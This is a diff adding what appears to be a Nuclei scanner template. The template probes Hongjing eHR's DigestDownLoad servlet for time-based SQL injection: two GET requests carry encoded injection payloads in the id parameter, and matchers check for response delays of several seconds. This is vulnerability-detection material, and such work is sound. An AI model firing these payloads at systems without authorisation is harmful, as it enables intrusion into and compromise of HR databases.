@@ -1,0 +1,24 @@
+id: hjeHR-DigestDownLoad-sql-time
+
+info:
+  name: 宏景eHR DigestDownLoad SQL注入漏洞
+  author: xxx
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /servlet/DigestDownLoad?type=original&id=i8hoHAILh4YkvJtIAayRbgJzqZUPAATTP2HJBPAATTPfhxbhGm4jOsPAATTP2HJFPAATTPyM8PAATTP3HJDPAATTP HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+      - |
+        GET /servlet/DigestDownLoad?type=original&id=FAAor8PAATTP2HJBPAATTPponI4yXkPAATTP2HJBPAATTPcVlfbP56PAATTP2HJFPAATTPPAATTP2HJFPAATTPkfU7lSDv5nFnpafrEPAATTP3HJDPAATTP HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=3 && duration_1<=4'  
+          - 'duration_2>=5 && duration_2<=6'
+        condition: and
